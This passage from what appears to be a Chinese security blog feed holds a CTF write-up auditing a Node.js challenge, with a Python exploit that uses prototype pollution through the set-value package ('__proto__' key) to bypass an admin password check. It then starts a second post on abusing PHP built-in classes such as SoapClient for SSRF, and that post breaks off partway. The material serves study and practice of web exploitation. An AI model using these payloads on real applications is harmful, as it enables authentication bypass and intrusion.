    <span class="token string-property property">"Lv4"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string-property property">"Bounty"</span><span class="token operator">:</span> <span class="token string">"30"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string-property property">"Lv5"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">,</span> <span class="token string-property property">"Bounty"</span><span class="token operator">:</span> <span class="token string">"65"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string-property property">"Lv6"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"80"</span><span class="token punctuation">,</span> <span class="token string-property property">"Bounty"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> <span class="token constant">BOSS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Times have not changed</span>
    <span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"201"</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> Admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"password1"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p1<span class="token punctuation">,</span>
    <span class="token string-property property">"password2"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p2<span class="token punctuation">,</span>
    <span class="token string-property property">"password3"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p3
<span class="token punctuation">&#125;</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/BuyWeapon'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// not implement</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/EarnBounty'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// not implement</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/ChallengeBOSS'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// not implement</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/DeveloperControlPanel"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// not implement</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>Admin<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Wrong password!Are you Admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">"HP"</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>
        <span class="token string-property property">"Gold"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
        <span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token number">10</span>
    <span class="token punctuation">&#125;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's begin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/Privilege"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Why not ask witch for help?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeKey<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> value <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>NewAttributeValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">setFn</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's have a check!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre>

<p>审计代码，flag在环境变量中，需要访问<code>DeveloperControlPanel</code>这个路由，并且需要<code>Admin[key] === password</code>，简单来说我们需要知道p1、p2、p3中的任意一个密码即可拿到flag</p>
<p>根据提示看到<code>Privilege</code>路由，这里访问时<code>knight</code>这个<code>session</code>没定义，则重定向到<code>SpawnPoint</code>创建一个，随后再访问的时候需要携带<code>NewAttributeKey</code>和<code>NewAttributeValue</code>两个参数，来进行<code>setFn</code>操作，可以看到<code>setFn</code>在头部定义<code>const setFn = require(&#39;set-value&#39;);</code></p>
<ul>
<li><p><a href="https://www.npmjs.com/package/set-value">set-value</a> : Set nested properties on an object using dot notation. / 使用点表示法在对象上设置嵌套属性。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> set <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'a.b.c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//=> &#123; a: &#123; b: &#123; c: 'd' &#125; &#125; &#125;</span></code></pre>

</li>
</ul>
<p>跟进到这个包的源代码</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'use strict'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> isPlain <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'is-plain-object'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> target<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">let</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> isArray <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isArray <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> path <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> target<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">let</span> merge <span class="token operator">=</span> opts<span class="token punctuation">.</span>merge<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> merge <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    merge <span class="token operator">=</span> Object<span class="token punctuation">.</span>assign<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> keys <span class="token operator">=</span> isArray <span class="token operator">?</span> path <span class="token operator">:</span> <span class="token function">split</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> len <span class="token operator">=</span> keys<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  <span class="token keyword">const</span> orig <span class="token operator">=</span> target<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options <span class="token operator">&amp;&amp;</span> keys<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> target<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> prop <span class="token operator">=</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">result</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> prop<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    target <span class="token operator">=</span> target<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">return</span> orig<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">result</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">,</span> merge</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>merge <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isPlain</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> target<span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    target<span class="token punctuation">[</span>path<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>构造<code>NewAttributeKey</code>为<code>__proto__.extrader</code>，<code>NewAttributeValue</code>为<code>extrader</code></p>
<p><code>path</code>被拆分成<code>[&#39;__proto__&#39;,&#39;extrader&#39;]</code>，第一次的for循环，将<code>target = target[prop]</code>，此时的<code>prop</code>就是<code>__proto__</code>，经过一次循环后<code>target</code>就为<code>req.session.knight.__proto__</code>了，随后<code>i === len - 1</code>判断为最后一个值，进入<code>result</code></p>
<p>主要看到<code>result</code>这个方法，会将<code>value</code>赋值给<code>target[path]</code>,存在赋值操作,便出现了原型链污染  </p>
<p>传入<code>result</code>函数的<code>target</code>为<code>req.session.knight.__proto__</code>，<code>req.session.knight</code>的原型是<code>Object</code>，即<code>Object.prototype</code>，我们就可以在<code>Object</code>这个类中定义变量<code>req.session.knight.__proto__[path] = value</code>，即<code>Object.prototype[path] = value</code>，键为path，值为value，value和path我们都可控</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605181626037.png" alt loading="lazy"></p>
<p>Exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:3000/'</span>

data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"NewAttributeKey"</span> <span class="token punctuation">:</span> <span class="token string">"__proto__.extrader"</span><span class="token punctuation">,</span>
    <span class="token string">"NewAttributeValue"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span>
<span class="token punctuation">&#125;</span>

data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"key"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span><span class="token punctuation">,</span>
    <span class="token string">"password"</span> <span class="token punctuation">:</span> <span class="token string">"extrader"</span>
<span class="token punctuation">&#125;</span>

session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'SpawnPoint'</span><span class="token punctuation">)</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'Privilege'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'DeveloperControlPanel'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a></li>
<li><a href="https://xz.aliyun.com/t/7182">浅析javascript原型链污染攻击</a></li>
<li><a href="https://www.huaweicloud.com/articles/588bbccfd343112b66fba197a74dd245.html">JS中的prototype、__proto__与constructor</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>原型链</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>php原生类利用</title>
    <url>/posts/35c0085d/</url>
    <content><![CDATA[<h3 id="Class-Found"><a href="#Class-Found" class="headerlink" title="Class Found"></a>Class Found</h3><p><strong>php中含魔术方法的内置类</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 返回由已定义类的名字所组成的数组</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 返回由类的方法名组成的数组</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
            <span class="token string single-quoted-string">'__destruct'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__toString'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__wakeup'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__call'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__callStatic'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__get'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__set'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__isset'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__unset'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__invoke'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'__set_state'</span>
        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<h3 id="SoapClient-call"><a href="#SoapClient-call" class="headerlink" title="SoapClient::__call"></a>SoapClient::__call</h3><p>可进行SSRF</p>
<p><strong>range</strong>：<code>PHP 5, PHP 7, PHP 8</code></p>
<blockquote>
<p>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。</p>
<p>其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议</p>
<p>SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</p>
<p>如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项</p>
</blockquote>
<pre class="language-php" data-language="php"><code class="language-php">SoapClient <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 方法 */</span>
    <span class="token keyword">public</span> <span class="token function">__construct</span> <span class="token punctuation">(</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$wsdl</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token function">__call</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>
    <span class="token keyword">public</span> <span class="token function">__doRequest</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$request</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$action</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$version</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$oneWay</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getCookies</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span>
    <span class="token keyword">public</span> <span class="token function">__getFunctions</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastRequest</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastRequestHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastResponse</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getLastResponseHeaders</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__getTypes</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__setCookie</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">void</span>
    <span class="token keyword">public</span> <span class="token function">__setLocation</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span>
    <span class="token keyword">public</span> <span class="token function">__setSoapHeaders</span> <span class="token punctuation">(</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
